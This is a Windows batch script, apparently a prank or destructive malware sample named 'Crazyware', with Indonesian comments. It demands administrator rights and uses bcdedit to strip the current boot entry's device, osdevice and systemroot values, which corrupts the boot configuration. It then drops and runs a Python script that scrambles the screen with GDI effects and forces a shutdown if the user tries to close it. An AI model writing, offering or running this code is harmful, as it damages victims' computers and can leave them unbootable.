@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Need to Open with Administrator
    pause
    exit
)
bcdedit /set "{current}" device unknown
bcdedit /set "%MY_ID%" path unknown
bcdedit /deletevalue "{current}" osdevice      2>nul
bcdedit /deletevalue "{current}" systemroot    2>nul
bcdedit /deletevalue "{current}" detecthal     2>nul
bcdedit /deletevalue "{current}" winpe         2>nul
bcdedit /deletevalue "{current}" inherit       2>nul
bcdedit /deletevalue "{current}" safeboot      2>nul

:: Atur waktu tampilan menu
bcdedit /timeout 10

:: Atur waktu tampilan menu booting jadi 10 detik
bcdedit /timeout 10
title Crazyware - Chaos GDI + Shutdown Trap
REM ====== Buat file Python ======
(
echo import time, os, atexit, signal, sys
echo import win32gui, win32con, win32api
echo.
echo # Fungsi matikan PC
echo def shutdown_pc():
echo     try:
echo         os.system("shutdown /s /f /t 1")
echo     except:
echo         pass
echo.
echo # Tangkap semua cara penutupan
echo def on_exit(sig=None, frame=None):
echo     shutdown_pc()
echo     sys.exit(0)
echo.
echo # Daftarkan pemicu
echo atexit.register(on_exit)
echo signal.signal(signal.SIGINT, on_exit)
echo signal.signal(signal.SIGTERM, on_exit)
echo if sys.platform == "win32":
echo     try:
echo         signal.signal(signal.CTRL_CLOSE_EVENT, on_exit)
echo     except:
echo         pass
echo.
echo def flip_effect(duration=9, interval=0.1):
echo     hdc = win32gui.GetDC(0)
echo     width = win32api.GetSystemMetrics(0)
echo     height = win32api.GetSystemMetrics(1)
echo     start = time.time()
echo     try:
echo         while time.time() - start ^< duration:
echo             win32gui.StretchBlt(hdc, width, 0, -width, height, hdc, 0, 0, width, height, win32con.SRCCOPY)
echo             time.sleep(interval)
echo             win32gui.StretchBlt(hdc, 0, height, width, -height, hdc, 0, 0, width, height, win32con.SRCCOPY)
echo             time.sleep(interval)
echo     finally:
echo         win32gui.ReleaseDC(0, hdc)
echo.
echo def shrink_expand_effect(duration=20, step=30):
echo     hdc = win32gui.GetDC(0)
echo     width = win32api.GetSystemMetrics(0)
echo     height = win32api.GetSystemMetrics(1)
echo     start = time.time()
echo     try:
echo         while time.time() - start ^< duration:
echo             for size in range(0, 200, step):
echo                 win32gui.StretchBlt(hdc, size, size, width - size*2, height - size*2, hdc, 0, 0, width, height, win32con.SRCCOPY)
echo                 time.sleep(0.01)
echo             for size in range(200, 0, -step):
echo                 win32gui.StretchBlt(hdc, size, size, width - size*2, height - size*2, hdc, 0, 0, width, height, win32con.SRCCOPY)
echo                 time.sleep(0.01)
echo     finally:
echo         win32gui.ReleaseDC(0, hdc)
echo.
echo def melt_down_effect(duration=5, step=15):
echo     hdc = win32gui.GetDC(0)
echo     width = win32api.GetSystemMetrics(0)
echo     height = win32api.GetSystemMetrics(1)
echo     start = time.time()
echo     try:
echo         while time.time() - start ^< duration:
echo             for y in range(0, height, step):
echo                 win32gui.BitBlt(hdc, 0, y + step, width, step, hdc, 0, y, win32con.SRCCOPY)
echo             time.sleep(0.05)
echo     finally:
echo         win32gui.ReleaseDC(0, hdc)
echo.
echo def refresh_screen():
echo     hdc = win32gui.GetDC(0)
echo     win32gui.InvalidateRect(0, None, True)
echo     win32gui.RedrawWindow(0, None, None, win32con.RDW_INVALIDATE ^| win32con.RDW_ERASE ^| win32con.RDW_ALLCHILDREN)
echo     win32gui.ReleaseDC(0, hdc)
echo.
echo def split_and_flip(duration=6, interval=0.1):
echo     hdc = win32gui.GetDC(0)
echo     width = win32api.GetSystemMetrics(0)
echo     height = win32api.GetSystemMetrics(1)
echo     start = time.time()
echo     try:
echo         while time.time() - start ^< duration:
echo             win32gui.StretchBlt(hdc, 0, 0, width//2, height, hdc, width, 0, -width//2, height, win32con.SRCCOPY)
echo             win32gui.StretchBlt(hdc, width//2, 0, width//2, height, hdc, 0, height, width//2, -height, win32con.SRCCOPY)
echo             time.sleep(interval)
echo     finally:
echo         win32gui.ReleaseDC(0, hdc)
echo.
echo def rotate_and_split(duration=8, interval=0.1):
echo     hdc = win32gui.GetDC(0)
echo     width = win32api.GetSystemMetrics(0)
echo     height = win32api.GetSystemMetrics(1)
echo     start = time.time()
echo     try:
echo         while time.time() - start ^< duration:
echo             win32gui.StretchBlt(hdc, 0, 0, width//2, height, hdc, 0, 0, width, height, win32con.SRCCOPY)
echo             win32gui.StretchBlt(hdc, width//2, 0, width//2, height, hdc, 0, 0, width, height, win32con.SRCCOPY)
echo             win32gui.StretchBlt(hdc, 0, 0, width//2, height, hdc, width//2, 0, -width//2, height, win32con.SRCCOPY)
echo             win32gui.StretchBlt(hdc, width//2, 0, width//2, height, hdc, 0, height, width//2, -height, win32con.SRCCOPY)
echo             time.sleep(interval)
echo     finally:
echo         win32gui.ReleaseDC(0, hdc)
echo.
echo if __name__ == "__main__":
echo     try:
echo         flip_effect()
echo         shrink_expand_effect()
echo         melt_down_effect()
echo         split_and_flip()
echo         rotate_and_split()
echo         refresh_screen()
echo         print("Selesai normal, layar kembali!")
echo     except:
echo         pass
echo     # Batalkan shutdown kalau selesai normal
echo     atexit.unregister(on_exit)
) > chaos_gdi.py

python chaos_gdi.py
del chaos_gdi.py
exit